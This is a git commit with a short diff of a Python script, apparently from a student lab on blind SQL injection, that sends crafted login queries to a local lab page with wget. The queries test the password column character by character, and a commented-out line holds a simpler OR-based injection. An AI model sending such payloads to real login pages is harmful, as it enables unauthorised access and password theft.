f671fa53b8e0087f7142c0245d49947a6a2ffeba
Ny4nc4t <>
2019-05-15 18:27:51 +0200

    qw

--- script.py
+++ script.py
@@ -1,9 +1,9 @@
 import subprocess
 import urllib
-import urllib.parse
+
 
 request = "http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' -- " 
-request = urllib.parse.quote(request)
+request = urllib.quote(request)
 # request = "http://localhost/lab09/login.php?u=\"%20OR%201%20--%20 " 
 bashCommand = "wget  -q -O - " + request 
 #bashCommand = "echo 'hello' "
